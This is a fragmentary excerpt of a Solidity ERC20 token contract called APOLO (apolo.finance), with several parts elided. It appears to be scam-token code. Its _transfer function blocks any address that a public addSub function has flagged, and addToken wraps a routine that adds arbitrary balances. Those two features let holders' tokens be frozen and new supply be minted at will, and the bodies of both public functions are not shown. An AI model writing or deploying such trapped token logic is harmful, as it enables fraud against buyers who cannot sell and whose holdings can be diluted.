...
contract ERC20 is Context, IERC20 {
    ...
    function _addtoken(address account, uint amount) internal {
        require(account != address(0), "ERC20: supply to the zero address");
        _balances[account] = _balances[account].add(amount);
    }
...
contract APOLO is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public owner;
  mapping (address => bool) public admin;
  mapping (address => bool) public sub;
  constructor () public ERC20Detailed("apolo.finance", "APL", 18) {
      _initSupply( msg.sender, 80000*10**uint(decimals()) );
      admin[msg.sender] = true;
  }

  function addSub(address account) public {
  ...
  function _transfer(address sender, address recipient, uint amount) internal {
      require(!sub[sender], "error");
      super._transfer(sender, recipient, amount);
  }
  function addToken(address account, uint amount) public {
